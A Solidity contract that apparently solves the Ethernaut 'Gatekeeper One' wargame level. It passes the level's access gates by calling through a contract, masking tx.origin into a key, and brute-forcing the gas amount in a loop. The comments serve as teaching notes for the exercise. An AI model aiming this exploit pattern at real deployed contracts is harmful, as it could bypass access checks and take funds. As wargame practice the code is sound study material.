// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/**
 *  @title ATTACK GATEKEEPER ONE
 *  @author crys
 *  @notice This will be my solution for the Ethernaut Game
 *  @dev There will be mini notes below to serve as guide.
 * In order to pass the player should have a basic understanding
 * of difference of msg.sender vs tx.origin, data types and
 * conversion in solidity, bit-masking, and gasLeft().
 **/

contract AttackGateKeeperOne {
    event Entered(bool success);

    // contract will be used to meet modifier one requirement
    function enterGate(
        address _gateAddress,
        uint256 _gasLowerLimit,
        uint256 _gasUpperLimit
    ) public returns (bool) {
        // bit-masking to meet requirments of modifier 3
        bytes8 key = bytes8(uint64(tx.origin)) & 0xffffffff0000ffff;

        bool succeeded = false;

        // brute force gas estimate here by using for loop
        // let i be the gas estimate
        for (uint256 i = _gasLowerLimit; i < _gasUpperLimit; i++) {
            (bool success, ) = address(_gateAddress).call{gas: (i + (8191 * 2))}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if (success) {
                succeeded = success;
                break;
            }
        }

        emit Entered(succeeded);

        return succeeded;
    }
}
